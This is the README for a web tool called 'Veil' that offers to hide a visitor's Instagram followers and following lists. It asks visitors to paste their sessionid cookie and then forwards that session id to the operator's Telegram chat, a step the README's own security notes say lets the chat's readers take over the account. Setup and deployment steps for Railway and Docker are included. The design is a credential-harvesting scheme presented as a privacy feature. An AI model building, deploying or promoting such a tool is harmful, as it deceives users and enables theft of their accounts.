# Veil — hide Instagram followers & following

A one-paste tool. The visitor pastes their own `sessionid` cookie, the server flips
Instagram's `hide_followers_following_list` setting, reads it back to confirm, and
forwards the session plus the outcome to your Telegram chat.

No password, no OAuth app, no database. The change is stored on Instagram's side.

## How it works

1. `POST /api/hide` with `{"session": "...", "hide": true}`.
2. `instagram.py` validates the session, calls `accounts/current_user`, reads the
   current setting, writes the new one, and reads it back to confirm.
3. `server.py` replies `{"ok": true, "hidden": true, "confirmed": true, ...}` and
   sends the session id and result to Telegram.

`hide: false` reverses it.

## Environment

| Variable | Required | Purpose |
| --- | --- | --- |
| `TELEGRAM_BOT_TOKEN` | for alerts | Bot token from @BotFather |
| `TELEGRAM_CHAT_ID` | for alerts | Your chat id (`/getUpdates` after messaging the bot) |
| `PORT` | no | Listen port, default `8080` |

Without the two Telegram variables the site still works; alerts are silently skipped
and `/health` reports `telegram_configured: false`.

## Run locally

```sh
pip install -r requirements.txt
python server.py
```

Open http://localhost:8080. `python main.py` prints an offline sanity check.

## Deploy (Railway)

1. Push this folder as the repo root.
2. New project → Deploy from repo. `railway.json` selects the Dockerfile.
3. Add `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` under Variables.
4. Keep replicas at 1 — rate limiting is in-process.

```sh
docker build -t veil .
docker run --rm -p 8080:8080 -e TELEGRAM_BOT_TOKEN=... -e TELEGRAM_CHAT_ID=... veil
```

## Endpoints

| Route | Method | Notes |
| --- | --- | --- |
| `/` | GET | The page |
| `/health`, `/api/health` | GET | Health + Telegram status |
| `/api/hide` | POST | `{"session": "...", "hide": true\|false}` |
| `/api/visit` | POST | Page-open beacon |

Rate limit: 12 runs per IP per 10 minutes. Body cap 16 KB.

## Security notes

- The session id is a bearer credential. It is stored only in memory for the
  duration of a request and then sent to Telegram in plaintext — anyone who can read
  that chat can act as the account until the session is revoked.
- `X-Forwarded-For` is trusted for rate limiting, which is correct behind Railway's
  proxy but spoofable if the port is exposed directly.
- The server sets CSP, `nosniff`, `no-referrer`, and `DENY` framing on every response.

Independent project. Not affiliated with Instagram or Meta.
